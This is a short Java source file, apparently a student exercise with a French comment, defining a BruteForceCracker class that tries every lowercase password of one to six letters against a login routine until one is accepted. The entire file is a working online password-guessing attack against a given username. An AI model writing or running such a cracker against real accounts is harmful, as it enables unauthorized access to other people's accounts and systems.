// c'est une classe cracker qui utilise la methode du bruteforce

import java.net.URISyntaxException;

class BruteForceCracker extends Cracker {
    
    public BruteForceCracker(String username,String foundPassword) throws URISyntaxException
       { 
        super(username,foundPassword) ;
        String word ;

        // char [] alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9'};
                char [] alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'} ;

found:  for (int i = 0; i < 26 ; i++) 
         { 
            word = ""+alphabet[i] ;
           if(Connexion._connexion(this.username,word)== 0){ this.foundPassword=word ; break found ;}


           for (int j = 0; j < 26 ; j++) 
           {
            word = ""+alphabet[i]+alphabet[j] ;
                  if(Connexion._connexion(this.username,word)== 0){ this.foundPassword=word ; break found ;}


            for (int k = 0; k < 26 ; k++) 
            { 
                word = ""+alphabet[i]+alphabet[j]+alphabet[k] ;
                 if(Connexion._connexion(this.username,word)== 0) {this.foundPassword=word ;  break found ;}


             for (int l = 0; l < 26 ; l++) 
             { 
                word = ""+alphabet[i]+alphabet[j]+alphabet[k]+alphabet[l];
                  if(Connexion._connexion(this.username,word)== 0){ this.foundPassword=word ;  break found ;}


              for (int m = 0; m < 26 ; m++) 
              { 
                word = ""+alphabet[i]+alphabet[j]+alphabet[k]+alphabet[l]+alphabet[m] ;
                   if(Connexion._connexion(this.username,word)== 0){ this.foundPassword=word ; break found ;}


               for (int n = 0; n < 26 ; n++) 
               {
                   
                word = ""+alphabet[i]+alphabet[j]+alphabet[k]+alphabet[l]+alphabet[m]+alphabet[n] ;
                         if(Connexion._connexion(this.username,word)== 0) { this.foundPassword=word ; break found ;}
               }  
              
              }  
             
             }  
            
            }  
            
           }  
          
         }  

         
    }
}

